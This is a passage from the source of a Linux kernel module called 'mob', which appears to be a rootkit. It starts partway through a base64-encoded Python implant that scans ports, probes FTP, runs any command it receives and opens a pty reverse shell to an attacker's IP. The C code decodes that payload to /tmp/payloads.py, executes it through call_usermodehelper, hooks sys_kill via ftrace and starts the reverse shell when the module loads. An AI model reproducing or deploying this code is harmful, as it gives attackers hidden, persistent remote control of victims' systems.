YXJncz0odGFyZ2V0X2lwLCkpCiAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgICAgICB0LnN0YXJ0KCkKCiAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgIHQuam9pbigpCgoKIyBGVFAgQ2hlY2tzCmZyb20gZnRwbGliIGltcG9ydCBGVFAKCiMgSWYgRlRQIGlzIG9wZW4gdGhlbiBjaGVjayBmb3IgYW5vbnltb3VzIGxvZ2luIGFuZCBhdmFpbGFibGUgY29tbWFuZHMuCmRlZiBjaGVja19mdHBfY2FwYWJpbGl0aWVzKGhvc3RuYW1lKToKICAgIHRyeToKICAgICAgICBmdHAgPSBGVFAoaG9zdG5hbWUpCiAgICAgICAgZnRwLmxvZ2luKCkgICMgVHJ5IGFub255bW91cyBsb2dpbgoKICAgICAgICAjIEdldCBhdmFpbGFibGUgY29tbWFuZHMKICAgICAgICBjb21tYW5kcyA9IGZ0cC5zZW5kY21kKCdoZWxwJykuc3BsaXQoJ1xuJykKICAgICAgICBwcmludCgiQXZhaWxhYmxlIEZUUCBjb21tYW5kczoiKQogICAgICAgIGZvciBjb21tYW5kIGluIGNvbW1hbmRzOgogICAgICAgICAgICBwcmludChjb21tYW5kKQoKICAgICAgICBmdHAucXVpdCgpCiAgICAgICAgcmV0dXJuICJBbm9ueW1vdXMgRlRQIGFjY2VzcyBpcyBhdmFpbGFibGUuIgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiAiQW5vbnltb3VzIEZUUCBhY2Nlc3MgaXMgbm90IGF2YWlsYWJsZSBvciBmYWlsZWQuIgoKCiMgRW50cnkgcG9pbnQgb2YgdGhlIHJldmVyc2Ugc2hlbGwKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgogICAgIyBTdWJtaXR0aW5nIERldmljZSBOYW1lIGFuZCBJUCB0byB0aGUgQzIgc2VydmVyLgogICAgIyBhZGRfZGV2aWNlKCkKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICAgICAgcHJpbnQoIkNvbm5lY3Rpb24gQWNjZXB0ZWQgZnJvbToge30iLmZvcm1hdChhZGRyKSkKICAgICAgICBkYXRhID0gY29ubi5yZWN2KDEwMjQpLmRlY29kZSgndXRmLTgnKQogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgZGF0YToKCiAgICAgICAgICAgICAgICBpZiBkYXRhLnN0YXJ0c3dpdGgoJ3NwYXduJyk6CiAgICAgICAgICAgICAgICAgICAgc3Bhd25fY29tbWFuZCA9IGRhdGEuc3BsaXQoKQogICAgICAgICAgICAgICAgICAgIGF0dGFja2VyX2lwID0gc3Bhd25fY29tbWFuZFsxXQogICAgICAgICAgICAgICAgICAgIHNwYXduX3BvcnQgPSBzcGF3bl9jb21tYW5kWzJdCiAgICAgICAgICAgICAgICAgICAgc3Bhd25fc2hlbGwgPSBmJ3B5dGhvbjMgLWMgXCdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCJ7YXR0YWNrZXJfaXB9Iix7c3Bhd25fcG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKVwnJwoKICAgICAgICAgICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oc3Bhd25fc2hlbGwsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICAgICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCdTcGF3bmVkJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgICAgICAgICAgICAgZWxpZiBkYXRhLnN0YXJ0c3dpdGgoJ3NjYW4nKToKICAgICAgICAgICAgICAgICAgICBwb3J0X2RpY3QgPSB7fQogICAgICAgICAgICAgICAgICAgIHRocmVhZF9zY2FubmVyKCkKICAgICAgICAgICAgICAgICAgICBmdHBfcmVzdWx0ID0gJycKCiAgICAgICAgICAgICAgICAgICAgZm9yIGtleSwgdmFsIGluIHBvcnRfZGljdC5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAnMjEnIGluIHZhbDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvc3RuYW1lID0ga2V5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdHBfcmVzdWx0ID0gY2hlY2tfZnRwX2NhcGFiaWxpdGllcyhob3N0bmFtZSkKCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gc3RyKHBvcnRfZGljdCkuZW5jb2RlKCd1dGYtOCcpICsgc3RyKGZ0cF9yZXN1bHQpLmVuY29kZSgndXRmLTgnKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICMgRXhlY3V0ZSB0aGUgY29tbWFuZCBhbmQgc2VuZCBiYWNrIHRoZSByZXN1bHQKICAgICAgICAgICAgICAgICAgICAjIHJlc3VsdCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGRhdGEuc3BsaXQoKSwgc2hlbGw9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgICAgIHJlc3VsdCA9IHBzLmNvbW11bmljYXRlKClbMF0gKyBzdHIoJzsgcGlkOiAnKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIob3MuZ2V0cGlkKCkpLmVuY29kZSgndXRmLTgnKSArIHN0cignOyBwcGlkOiAnKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIob3MuZ2V0cHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICByZXN1bHQgPSBzdHIoZSkuZW5jb2RlKCd1dGYtOCcpCgogICAgICAgIGNvbm4uc2VuZChyZXN1bHQpCiAgICAgICAgY29ubi5jbG9zZSgpCg==' | base64 -d > /tmp/payloads.py && python3 /tmp/payloads.py", NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret < 0) {
        pr_err("Failed to convert base64 string to file: %d\n", ret);
        return ret;
    }

    return 0;
}


static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init mob_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "mob: loaded\n");
    
    get_rev_shell();    // Getting reverse shell
    printk(KERN_INFO "mob: Getting reverse shell\n");

    return 0;
}

static void __exit mob_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "mob: unloaded\n");
}

module_init(mob_init);
module_exit(mob_exit);